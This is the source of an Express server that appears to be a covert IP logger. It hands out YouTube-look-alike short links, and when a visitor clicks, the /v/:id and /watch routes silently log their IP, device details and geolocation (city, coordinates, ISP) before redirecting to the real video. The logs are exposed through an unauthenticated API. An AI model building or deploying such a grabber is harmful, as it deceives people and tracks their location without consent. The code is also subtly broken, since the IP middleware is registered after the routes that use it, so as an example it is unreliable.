const express = require('express');
const axios = require('axios');
const path = require('path');
const useragent = require('useragent');

const app = express();
const PORT = process.env.PORT || 3000;
const SERVER_URL = process.env.SERVER_URL || 'https://ip-logger-kpo8.onrender.com';

// Store IPs in memory
let trackedIPs = [];

// Store URL mappings
let urlMappings = new Map();

// Fonction pour générer un ID YouTube-like
function generateYouTubeId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    let result = '';
    for (let i = 0; i < 11; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Route pour créer un lien court
app.get('/api/shorten', (req, res) => {
    try {
        const originalUrl = req.query.url;
        if (!originalUrl) {
            return res.status(400).json({ error: 'URL required' });
        }

        // Extraire le video ID
        const videoId = originalUrl.split('v=')[1];
        if (!videoId) {
            return res.status(400).json({ error: 'Invalid video ID' });
        }

        const shortId = generateYouTubeId();
        // Stocker le video ID au lieu de l'URL complète
        urlMappings.set(shortId, videoId);
        
        if (urlMappings.size > 1000) {
            const firstKey = urlMappings.keys().next().value;
            urlMappings.delete(firstKey);
        }

        const shortUrl = `https://youtu.be/${shortId}`;
        console.log('\x1b[32m%s\x1b[0m', `Generated short URL: ${shortUrl} for video: ${videoId}`);
        
        res.json({ 
            shortUrl: shortUrl,
            fullUrl: `${SERVER_URL}/v/${shortId}`
        });
    } catch (error) {
        console.error('\x1b[31m%s\x1b[0m', `Error generating short URL: ${error}`);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Route pour rediriger les liens courts
app.get('/v/:id', async (req, res) => {
    const videoId = urlMappings.get(req.params.id);
    if (!videoId) {
        return res.redirect('https://youtube.com');
    }
    
    try {
        // Traitement de l'IP et autres données...
        let ip = req.realIp.replace('::ffff:', '');
        ip = ip.split(',')[0].trim();
        
        console.log('\x1b[36m%s\x1b[0m', `New visit from IP: ${ip}`);

        // Parse user agent
        const agent = useragent.parse(req.headers['user-agent']);
        const deviceInfo = {
            browser: agent.family,
            browserVersion: agent.toVersion(),
            os: agent.os.toString(),
            device: agent.device.family,
            isMobile: agent.device.family !== 'Other',
            isBot: agent.isBot
        };

        console.log('\x1b[36m%s\x1b[0m', `Device info: ${JSON.stringify(deviceInfo)}`);

        // Pour les tests locaux
        if (ip === '::1' || ip === '127.0.0.1') {
            ip = '8.8.8.8';
            console.log('\x1b[33m%s\x1b[0m', `Local IP detected, using test IP: ${ip}`);
        }

        try {
            const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
            
            if (ipInfo.data.status === 'success') {
                console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
                
                // Store in memory with device info
                trackedIPs.push({
                    ip: ip,
                    country: ipInfo.data.country,
                    city: ipInfo.data.city,
                    latitude: ipInfo.data.lat,
                    longitude: ipInfo.data.lon,
                    timestamp: new Date().toISOString(),
                    deviceInfo: deviceInfo,
                    isp: ipInfo.data.isp,
                    org: ipInfo.data.org,
                    as: ipInfo.data.as,
                    timezone: ipInfo.data.timezone
                });

                console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);

                if (trackedIPs.length > 100) {
                    trackedIPs = trackedIPs.slice(-100);
                }
            } else {
                console.error('\x1b[31m%s\x1b[0m', `IP API returned error status: ${ipInfo.data.message}`);
            }
        } catch (apiError) {
            console.error('\x1b[31m%s\x1b[0m', `Error calling IP API: ${apiError.message}`);
        }

        // Rediriger vers la vraie vidéo YouTube
        res.redirect(`https://youtube.com/watch?v=${videoId}`);
    } catch (error) {
        console.error('\x1b[31m%s\x1b[0m', `Error processing request: ${error}`);
        res.redirect('https://youtube.com');
    }
});

// Add CORS headers
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Middleware to get real IP
app.use((req, res, next) => {
    req.realIp = req.headers['x-forwarded-for'] || 
                 req.connection.remoteAddress || 
                 req.socket.remoteAddress;
    next();
});

// Watch route that mimics YouTube
app.get('/watch', async (req, res) => {
    try {
        const videoId = req.query.v;
        
        // Get real IP and clean it
        let ip = req.realIp.replace('::ffff:', '');
        ip = ip.split(',')[0].trim();
        
        console.log('\x1b[36m%s\x1b[0m', `New visit from IP: ${ip}`);

        // Parse user agent
        const agent = useragent.parse(req.headers['user-agent']);
        const deviceInfo = {
            browser: agent.family,
            browserVersion: agent.toVersion(),
            os: agent.os.toString(),
            device: agent.device.family,
            isMobile: agent.device.family !== 'Other',
            isBot: agent.isBot
        };

        console.log('\x1b[36m%s\x1b[0m', `Device info: ${JSON.stringify(deviceInfo)}`);

        // Pour les tests locaux
        if (ip === '::1' || ip === '127.0.0.1') {
            ip = '8.8.8.8';
            console.log('\x1b[33m%s\x1b[0m', `Local IP detected, using test IP: ${ip}`);
        }

        try {
            const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
            
            if (ipInfo.data.status === 'success') {
                console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
                
                // Store in memory with device info
                trackedIPs.push({
                    ip: ip,
                    country: ipInfo.data.country,
                    city: ipInfo.data.city,
                    latitude: ipInfo.data.lat,
                    longitude: ipInfo.data.lon,
                    timestamp: new Date().toISOString(),
                    deviceInfo: deviceInfo,
                    isp: ipInfo.data.isp,
                    org: ipInfo.data.org,
                    as: ipInfo.data.as,
                    timezone: ipInfo.data.timezone
                });

                console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);

                if (trackedIPs.length > 100) {
                    trackedIPs = trackedIPs.slice(-100);
                }
            } else {
                console.error('\x1b[31m%s\x1b[0m', `IP API returned error status: ${ipInfo.data.message}`);
            }
        } catch (apiError) {
            console.error('\x1b[31m%s\x1b[0m', `Error calling IP API: ${apiError.message}`);
        }

        if (videoId) {
            res.redirect(`https://youtube.com/watch?v=${videoId}`);
        } else {
            res.redirect('https://youtube.com');
        }

    } catch (error) {
        console.error('\x1b[31m%s\x1b[0m', `Error processing request: ${error}`);
        res.redirect('https://youtube.com');
    }
});

// API route to get tracked IPs
app.get('/api/tracked-ips', (req, res) => {
    console.log('\x1b[36m%s\x1b[0m', `API request received from: ${req.ip}`);
    console.log('\x1b[32m%s\x1b[0m', `API: Found ${trackedIPs.length} entries in memory`);
    res.json(trackedIPs);
});

// Test route
app.get('/api/test', (req, res) => {
    res.json({ status: 'ok', message: 'API is working' });
});

// Start server
app.listen(PORT, () => {
    console.log('\x1b[32m%s\x1b[0m', `Server running on port ${PORT}`);
}); 